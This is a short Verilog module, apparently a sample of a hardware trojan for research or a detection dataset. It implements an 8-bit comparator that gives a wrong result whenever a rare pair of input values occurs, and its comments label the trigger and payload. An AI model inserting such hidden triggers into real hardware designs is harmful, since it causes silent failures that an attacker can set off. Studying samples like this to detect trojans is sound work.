module cmp8(input [7:0] a, input [7:0] b, output gt);
  wire trojan_trigger;
  wire trojan_payload;
  // Trigger: rare condition when a == 8'hA5 and b == 8'h3C
  assign trojan_trigger = (a == 8'hA5) && (b == 8'h3C);
  // Payload: when triggered, force gt to 0 (degrade performance: wrong comparison result)
  assign trojan_payload = trojan_trigger ? 1'b0 : (a > b);
  assign gt = trojan_payload;
endmodule